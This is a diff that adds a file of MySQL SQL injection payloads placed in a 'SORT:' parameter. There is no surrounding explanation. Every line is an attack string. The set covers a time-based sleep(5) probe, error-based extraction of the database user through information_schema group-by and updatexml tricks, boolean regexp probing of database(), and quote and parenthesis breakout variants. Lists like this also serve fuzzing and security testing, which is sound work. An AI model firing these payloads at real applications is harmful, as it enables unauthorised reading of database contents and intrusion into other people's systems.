@@ -1,0 +1,18 @@
+SORT:1
+SORT:1\
+SORT:1 and if(1=1, !sleep(5), 0) -- 
+SORT:1 and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1 and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1 and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1 and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1' and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1" and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1') and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1 and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:1") and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) -- 
+SORT:(select updatexml(1, concat("::", (select     user()), "::"), 1)) -- 
+SORT:(select updatexml(1, concat("::", (select user()), "::"), 1)) -- 
+SORT:1 and database() regexp ^[a-z]-- 
+SORT:1 and database() regexp [a-z]-- 
+SORT:1 and database() regexp '[a-z]'-- 
+SORT:1 and database() regexp '^[a-z]'-- 
